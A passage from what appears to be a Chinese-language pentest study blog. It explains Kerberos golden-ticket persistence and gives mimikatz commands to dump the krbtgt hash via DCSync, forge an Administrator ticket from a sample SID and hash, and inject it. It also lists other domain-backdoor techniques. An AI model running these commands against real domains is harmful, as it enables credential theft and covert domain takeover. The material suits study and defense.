<h2 id="0x05-权限维持：黄金票据"><a href="#0x05-权限维持：黄金票据" class="headerlink" title="0x05 权限维持：黄金票据"></a>0x05 权限维持：黄金票据</h2><p>原理<br>每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？</p>
<p>实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket</p>
<p>获取krbtgt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;lsadump::dcsync /domaintest.com /user:krbtgt&quot;</span><br></pre></td></tr></table></figure></p>
<p>构造黄金票据并注入内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">mimikatz # kerberos::golden /admin:Administrator /domain:domaintest.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribi</span><br><span class="line">mimikatz # kerberos::ptt Administrator.kiribi</span><br><span class="line">mimikatz # kerberos::tgt</span><br></pre></td></tr></table></figure></p>
<p>当然除了golden ticket，silver ticket之外还有kerberos ticket，历史SID，AdminSDHolder，DSRM，GPP，DCSync等技术手段都可以用来当做域控的隐藏后门。</p>
<p>  参考文章<br>  <a href="http://drops.xmd5.com/static/drops/tips-12159.html" target="_blank" rel="noopener">域渗透——Pass The Ticket</a><br>  <a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">l3m0n:从零开始内网渗透学习</a><br>  <a href="https://paper.tuisec.win/detail/2a7446285e7d085" target="_blank" rel="noopener">初级域渗透系列 - 01. 基本介绍&amp;信息获取</a><br>  <a href="https://paper.tuisec.win/detail/fc1086dabbc9002" target="_blank" rel="noopener">初级域渗透系列 - 02. 常见攻击方法 - 1</a><br>  <a href="https://paper.tuisec.win/detail/cd49c17ca23cece" target="_blank" rel="noopener">初级域渗透系列 - 03. 常见攻击方法</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">boogle</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">32</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">categories</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">12</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">boogle</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
